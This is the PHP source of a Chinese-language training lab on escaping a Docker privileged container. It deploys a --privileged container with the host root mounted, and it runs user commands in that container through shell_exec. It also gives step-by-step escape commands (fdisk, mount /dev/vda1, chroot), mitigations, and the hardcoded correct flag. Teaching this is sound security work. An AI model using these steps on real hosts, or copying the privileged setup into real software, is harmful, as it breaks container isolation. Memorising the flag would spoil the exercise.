...
$CORRECT_FLAG = "flag{Docker_Privileged_Mode_Host_Mount_Escape_Done}";
$flag_result = "";
$user_flag = "";
...
if (isset($_POST['submit_flag'])) {
    ...
    if ($user_flag === $CORRECT_FLAG) {
        ...
        $flag_result = "<div class='alert alert-danger' style='border-radius:10px; font-weight:700; background:rgba(239,68,68,0.15); border:1px solid #ef4444; color:#ef4444;'><i class='fa fa-times-circle'></i> <b>Flag 错误</b>，请在 Bash 终端中完成挂载并查看 /flag_host.txt 文件！</div>";
    }
}
...
if (isset($_POST['start_sandbox'])) {
    shell_exec("/var/www/html/docker-cli rm -f pikachu-lab-priv-escape 2>&1");
    $out = shell_exec("/var/www/html/docker-cli run -d --name pikachu-lab-priv-escape --privileged -v /:/host_root docker.m.daocloud.io/library/ubuntu:22.04 sleep infinity 2>&1");
    ...
    $sandbox_msg = "<div class='alert alert-success' style='border-radius:10px; font-weight:700;'><i class='fa fa-check'></i> 真实靶场容器 [pikachu-lab-priv-escape] 已部署并在后台运行！</div>";
}
if (isset($_POST['stop_sandbox'])) {
    shell_exec("/var/www/html/docker-cli rm -f pikachu-lab-priv-escape 2>&1");
    $sandbox_msg = "<div class='alert alert-warning' style='border-radius:10px; font-weight:700;'><i class='fa fa-stop'></i> 真实靶场容器 [pikachu-lab-priv-escape] 已强制销毁清理！</div>";
}

// Check Sandbox Status
$is_sandbox_running = false;
$sandbox_uptime = '';
$status_check = shell_exec("/var/www/html/docker-cli ps --filter name=^pikachu-lab-priv-escape$ --format \"{{.Names}}	{{.Status}}\" 2>/dev/null");
$status_check = trim($status_check ?? '');
if (!empty($status_check) && strpos($status_check, 'pikachu-lab-priv-escape') !== false) {
...
if (isset($_POST['exec_cmd'])) {
    ...
    if ($raw_cmd !== '') {
        $output = dockerlab_exec_universal($raw_cmd, 'docker_privileged', $_SESSION['docker_priv_state'], $_SESSION['docker_priv_cwd']);
                ...
                <div class="cyber-header-card" style="border-left:4px solid #10b981; margin-bottom: 24px; display:flex; flex-direction:column; gap:16px;">
                    <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px;">
                        <div>
                            ...
                            <p style="margin:5px 0 0 0; color:var(--text-secondary); font-size:13px;">实战演练前，请先点击启动。系统将为您分配专属的隔离沙箱 <code>pikachu-lab-priv-escape</code>，用完后请销毁。</p>
                        </div>
...
docker exec pikachu-lab-priv-escape bash -c "echo 'flag{**********}' > /host_root/flag_host.txt"</div>
                    </details>
                </div>
                    ...
                    <div class="col-md-5">
                        <div class="cyber-guide-section">
                            ...
                            <div class="cyber-callout-danger">
                                ...
                                <p>当以 <code>--privileged</code> 标志启动容器时，Docker 会将物理机的全部内核 Capabilities 赋予容器，同时取消 AppArmor/Seccomp 安全沙箱限制。容器可直接读写裸块设备（如 <code>/dev/vda1</code> 或 <code>/dev/sda</code>），打破任何隔离屏障。</p>
                            </div>

                            <div class="cyber-callout-success">
                                <h5 style="color:#10b981; margin-top:0; font-weight:700;"><i class="fa fa-shield"></i> 最佳防御与修复方案</h5>
                                <ol>
                                    <li>严禁在生产环境中滥用 <code>--privileged</code> 参数。</li>
                                    <li>细粒度按需分配 Capabilities：如仅分配 <code>--cap-add=NET_ADMIN</code>。</li>
                                    <li>部署云原生安全审计工具 (Falco)：监控拦截容器内任意挂载设备和直接读写磁盘的行为。</li>
                                </ol>
                            </div>
                            ...
                            <div class="cyber-step-card">
                                <div class="cyber-step-header">
                                    ...
                                    <div class="cyber-step-title">探测裸磁盘设备</div>
                                </div>
                                <div class="cyber-principle-box">
                                    <b>【实战操作】</b> 使用 fdisk 命令查看当前容器能否看到宿主机的物理磁盘设备。
                                </div>
                                <div class="cyber-code-container">
                                    <span class="cyber-code-text">fdisk -l</span>
                                    <button type="button" class="cyber-copy-btn" onclick="fillCmd('fdisk -l')">填入终端</button>
                                </div>
                            </div>
                            ...
                            <div class="cyber-step-card">
                                <div class="cyber-step-header">
                                    ...
                                    <div class="cyber-step-title">挂载宿主机根分区</div>
                                </div>
                                <div class="cyber-principle-box">
                                    <b>【实战操作】</b> 将查看到的宿主机主分区（通常是 /dev/vda1 或 /dev/sda1）直接挂载到容器内的目录。
                                </div>
                                <div class="cyber-code-container">
                                    <span class="cyber-code-text">mkdir -p /host_root && mount /dev/vda1 /host_root</span>
                                    <button type="button" class="cyber-copy-btn" onclick="fillCmd('mkdir -p /host_root && mount /dev/vda1 /host_root')">填入终端</button>
                                </div>
                            </div>
                            ...
                            <div class="cyber-step-card">
                                <div class="cyber-step-header">
                                    ...
                                    <div class="cyber-step-title">切换命名空间获取控制权</div>
                                </div>
                                <div class="cyber-principle-box">
                                    <b>【实战操作】</b> 使用 chroot 切换当前根目录到挂载点，此时你已经完全接管了宿主机的文件系统。请读取 Flag！
                                </div>
                                <div class="cyber-code-container">
                                    <span class="cyber-code-text">chroot /host_root</span>
                                    <button type="button" class="cyber-copy-btn" onclick="fillCmd('chroot /host_root')">填入终端</button>
                                </div>
                            </div>
                            ...
                            <div class="cyber-step-card">
                                <div class="cyber-step-header">
                                    ...
                                    <div class="cyber-step-title" style="color:#ef4444;">获取 Flag</div>
                                </div>
                                <div class="cyber-principle-box">
                                    <b>【实战操作】</b> 在宿主机的根目录下读取 flag_host.txt 文件。
                                </div>
                                <div class="cyber-code-container">
                                    <span class="cyber-code-text">cat /flag_host.txt</span>
                                    <button type="button" class="cyber-copy-btn" onclick="fillCmd('cat /flag_host.txt')">填入终端</button>
                                </div>
                            </div>
...
const CURRENT_CONTAINER_NAME = 'pikachu-lab-priv-escape';
